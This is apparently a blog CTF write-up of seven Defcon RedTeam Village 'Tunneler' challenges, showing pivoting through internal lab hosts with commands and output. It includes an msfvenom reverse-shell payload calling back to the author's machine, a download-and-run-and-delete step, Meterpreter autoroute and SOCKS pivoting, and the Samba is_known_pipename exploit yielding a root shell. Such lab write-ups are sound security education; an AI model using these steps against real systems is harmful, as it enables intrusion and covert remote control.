---
layout: post
title:  "Defcon RedTeam Village CTF Tunneler 1-5,7,9 Solutions"
date:   2020-08-08
categories: CTF
thumbnail: /img/tunneler.webp
tags: ctf,defcon,redteamvillage
---
In the qualifiers round of Defcon RedTeam Village CTF, there were 10 Jeopardy-style challenges in the Tunneler section where we had to pivot from one host to another. I was able to solve 7 of them and here's how I did it. 


## # 1 Bastion
![tunneler](/img/tunneler.webp#center)

This was the starting point. All we had to do was to connect to any of the SSH host to get started on pivoting. User-Pass was already given.
```bash
$ ssh -p 2222  tunneler@161.35.239.216
```
First flag was displayed in the welcome message.


## # 2 Browsing Websites
The first challenge is to forward a port or forward tunnel to view a web server on an internal network. The address is 10.174.12.14 and it is listening on port 80.
If we check ifconfig from the remote box we can see:
```bash
$ ifconfig eth0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.174.12.182  netmask 255.255.255.0  broadcast 10.174.12.255
        ether 02:42:0a:ae:0c:b6  txqueuelen 0  (Ethernet)
        RX packets 4121119  bytes 1057763403 (1.0 GB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4952203  bytes 1927763145 (1.9 GB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```
Since our challenge is to read `10.174.12.14` which belongs to the same subnet, we can request it from this box. If the box had curl or wget we could just fetch it instantly. The box had `python3` so I just launched it and used requests module to fetch the web page content:
```python
$ python3
Python 3.8.2 (default, Jul 16 2020, 14:00:26) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import requests
>>> requests.get('http://10.174.12.14').content
b'<html>\n    <head>\n\n    </head>\n    <body>\n        <h2>Your First Tunnel!</h2>\n        <p>You made your first tunnel, take this flag as a reward for your hard work ts{TheFirstTunnelIsTheEasiest}</p>\n    </body>\n</html>'
```


## # 3 SSH in tunnels
Instruction for this was "SSH through the bastion to the pivot. IP: 10.218.176.199 User: whistler Pass: cocktailparty".

Since its an internal IP we cannot connect to it directly from our host and the box we are currently in doesn't have SSH client. So it required creating proxy for tunneling our request to the 2nd host via the first host. This could easily be done with SSH port forwarding but I decided to use metasploit instead because I thought It may help me pivot in later stages easily. 

I first created an ELF binary using msfvenom to receive connection to my box:
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<My-Machine-IP> LPORT=8080 -f elf > pay.bin
```
And started listening from msfconsole:
```bash
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 0.0.0.0
msf5 exploit(multi/handler) > set LPORT 8080
msf5 exploit(multi/handler) > run
```
Next, ran `python3 -m http.server` from my box to fetch the binary over HTTP to the remote box. Fetched the binary with below python3 code from the remote box and ran it:
```python
$ cd /tmp
$ python3 -c 'import requests, shutil
def download_file(url,local_filename):
    with requests.get(url, stream=True) as r:
        with open(local_filename, "wb") as f:
            shutil.copyfileobj(r.raw, f)
download_file("http://<My-Machine-IP>:8000/pay.bin","rh0x01")
'
$ chmod +x rh0x01; nohup ./rh0x01 &
$ rm -rf rh0x01 nohup.out
```
Next, ran the `autoroute` module to add all the subnets of my compromised session so we can probe any internal ip addresses of that host directly from our host.
```bash
meterpreter > run post/multi/manage/autoroute

[!] SESSION may not be compatible with this module.
[*] Running module against 10.174.12.182
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.1.1.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 10.174.12.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 10.218.176.0/255.255.255.0 from host's routing table.
meterpreter > 

```
Next, ran the `socks4a` module to create proxy so that we can tunnel our traffic via metasploit and since we have autoroute in place in metasploit we can reach any internal network using the proxy.
```bash
meterpreter > background
msf5 exploit(multi/handler) > use auxiliary/server/socks4a
msf5 auxiliary(server/socks4a) > run
```
Finally, Added the proxy in proxychains.conf:

```bash
root@ubuntu:~/defcon# echo "socks4 	127.0.0.1 1080" >> /etc/proxychains.conf
```
Now we can login to that internal host using proxychains with ssh:
```bash
proxychains ssh whistler@10.218.176.199
```
The flag was displayed in the welcome message.


## # 4 Beacons everywhere
The instruction for this was "Something is Beaconing to the pivot on port 58671-58680 to ip 10.112.3.199, can you tunnel it back?"

Since its the ip of the box we just connected to in previous challenge we can listen on any of those port in a loop to receive beacon data. I used the below python3 script to sniff the traffic:
```python
import socket
import sys
import sys

def sniff(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = (ip, port)
    sock.bind(server_address)
    sock.listen(1)
    while True:
        conn, client_address = sock.accept()
        while True:
            data = conn.recv(16)
            if data:
                print(data)
            else:
                break
        conn.close()
        
try:
    ip = sys.args[1]
    port = int(sys.args[2])
except IndexError as ierr:
    print("usage : python3 script.py ip port")
    sys.exit()

try:
    sniff(ip, port)
except KeyboardInterrupt:
    sys.exit()
``` 
I transfered the sniff.py in same way how I transfered the `pay.bin` file previously. Next, Ran the script:
```bash
python3 sniff.py 10.112.3.199 58671
```
It started listening in a loop for any connection on that port in a loop and after some time received the flag along with bunch of random data.


## # 5 Beacons annoying
The instruction for this was "Connect to ip: 10.112.3.88 port: 7000, a beacon awaits you". 

If we check ifconfig from the 2nd box:
```bash
$ ifconfig eth1
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.112.3.199  netmask 255.255.255.0  broadcast 10.112.3.255
        ether 02:42:0a:70:03:c7  txqueuelen 0  (Ethernet)
        RX packets 4382368  bytes 404233863 (404.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4081267  bytes 488559153 (488.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
the eth1 interface on the 2nd host belongs to same subnet as the given IP. I decided to drop my same msf binary in the 2nd box and ran autoroute to add all the subnets of the second host on metasploit's routing table. 

I copied the binary like before on the target host, started listening again on the msfconsole, and ran the binary from second box to receive another msf session. Next from the newly received meterpreter session I again ran the `autoroute` module to add the subnets:
```bash
meterpreter > run post/multi/manage/autoroute

[!] SESSION may not be compatible with this module.
[*] Running module against 10.218.176.199
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.112.3.0/255.255.255.0 from host's routing table.
meterpreter > 
```
Since now we have this new subnet added we don't need to create the proxy again, we can directly use proxychians now to probe the internal hosts on that subnet. I then connected to that host with netcat via proxychians and received below message:
```bash
root@ubuntu:~/defcon# proxychains nc 10.112.3.88 7000
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.112.3.88:7000-<><>-OK

I hope you like tunneling, I will send you the flag on a random port... How fast is your tunnel game?
I will send the flag to ip: 10.112.3.199 on port: 60916 in 15 secondsthe flag was sent, I hope you got it!
```
So we have to listen to a random port in 15 seconds from the 2nd box after connecting to that host on port 7000 to grab the flag.
This is fairly easy given that how we did the `4 Beacons everywhere` one. We have the script on that box already and we can just run the script again with the port number that will be mentioned after connecting to port 7000 on the given IP.
So I ran the previous command again and then from another terminal tab where I was already logged in on the second box, ran the script with mentioned port: 
```bash
$ python3 sniff.py 10.112.3.199 13885
```  
Received the flag in 15 seconds.


## # 7 Another Pivot
Instruction for this was "Connect to the second pivot IP: 10.112.3.12 User: crease Pass: NoThatsaV".

Since we already added the subnet of that IP from second box to our metasploit we can directly ssh to it via proxychains:
```bash
proxychains ssh crease@10.112.3.12
```
First flag was displayed in the welcome message.


## # 9 Samba
The instruction for this was "There is a samba server at 10.24.13.10, find a flag sitting in the root file system /"

If we check ifconfig from the 3rd box:
```bash
$ ifconfig eth2
eth2: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.24.13.73  netmask 255.255.255.0  broadcast 10.24.13.255
        inet6 fe80::42:aff:fe18:d49  prefixlen 64  scopeid 0x20<link>
        ether 02:42:0a:18:0d:49  txqueuelen 0  (Ethernet)
        RX packets 2013918  bytes 130317522 (130.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2228547  bytes 168461419 (168.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
The ip address of the 3rd box belongs to the same subnet as that samba server. Again I used the same plan to deploy my msf binary like last two times and add autoroute so I can access that host.

I copied the binary like before on the target host, started listening again on the msfconsole, and ran the binary from second box to receive another msf session. Next from the newly received meterpreter session I again ran the `autoroute` module to add the subnets:
```bash
meterpreter > run post/multi/manage/autoroute

[!] SESSION may not be compatible with this module.
[*] Running module against 172.19.0.3
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.24.13.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 172.19.0.0/255.255.0.0 from host's routing table.
meterpreter > 
```
We now have access to that subnet as well and we can target the samba server directly from our host.
There was a hint given in the challenge that "nothing to find in the shares".
Next, I ran `smbmap` via proxychains:
```bash
root@ubuntu:~/defcon# proxychains smbmap -H 10.24.13.10
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.24.13.10:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.24.13.10:445-<><>-OK
[+] Guest session   	IP: 10.24.13.10:445	Name: 10.24.13.10                                       
   Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	myshare                                           	READ, WRITE	smb share test
	IPC$                                              	NO ACCESS	IPC Service (Samba Server Version 4.6.3)
root@ubuntu:~/defcon# 
```
I then tried many things but there was no success. Next the Samba version looked interesting so I searched the version in `searchsploit`:
```bash
root@ubuntu:~/defcon# searchsploit Samba 4.6
--------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                   |  Path
                                                                                 | (/usr/share/exploitdb/)
--------------------------------------------------------------------------------- ----------------------------------------
Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' Arbitrary Module Load  | exploits/linux/remote/42084.rb
--------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
root@ubuntu:~/defcon# 
```
Since I was already in metasploit I could see the exploit has msf module:
```bash
meterpreter > background
[*] Backgrounding session 8...
msf5 exploit(multi/handler) > search is_known_pipename

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/linux/samba/is_known_pipename  2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load


msf5 exploit(multi/handler) > 
```
I then selected that exploit module, supplied all the necessary options, ran it, and got root shell on the samba host:
```bash
msf5 exploit(multi/handler) > use exploit/linux/samba/is_known_pipename
[*] No payload configured, defaulting to cmd/unix/interact
msf5 exploit(linux/samba/is_known_pipename) > set RHOSTS 10.24.13.10
msf5 exploit(linux/samba/is_known_pipename) > set SMB_SHARE_NAME myshare
msf5 exploit(linux/samba/is_known_pipename) > set SMB_FOLDER rh0x01
msf5 exploit(linux/samba/is_known_pipename) > run

[*] 10.24.13.10:445 - Using location \\10.24.13.10\myshare\ for the path
[*] 10.24.13.10:445 - Retrieving the remote path of the share 'myshare'
[*] 10.24.13.10:445 - Share 'myshare' has server-side path '/home/share
[*] 10.24.13.10:445 - Uploaded payload to \\10.24.13.10\myshare\oEXappTq.so
[*] 10.24.13.10:445 - Loading the payload from server-side path /home/share/oEXappTq.so using \\PIPE\/home/share/oEXappTq.so...
[-] 10.24.13.10:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 10.24.13.10:445 - Loading the payload from server-side path /home/share/oEXappTq.so using /home/share/oEXappTq.so...
[+] 10.24.13.10:445 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 10 opened (10.24.13.73:54362 -> 10.24.13.10:445) at 2020-08-10 11:09:53 +0000

id
uid=0(root) gid=0(root) groups=0(root)
ls -l /flag.txt
-rw-r--r-- 1 root root 23 Jun 16 11:08 /flag.txt

```
The flag was sitting on /flag.txt.


If we hop back on in msf session and check the "Active Routing Table" we can see we have access to all of these subnets so far:
```bash
msf5 exploit(linux/samba/is_known_pipename) > sessions -i 8
[*] Starting interaction with 8...

meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.1.1.0           255.255.255.0      Session 5
   10.24.13.0         255.255.255.0      Session 8
   10.112.3.0         255.255.255.0      Session 6
   10.174.12.0        255.255.255.0      Session 5
   10.218.176.0       255.255.255.0      Session 5
   172.19.0.0         255.255.0.0        Session 8

meterpreter > 
```
The tunneling challenge was very interesting and this was the first time I used metasploit to pivot into different hosts like that.
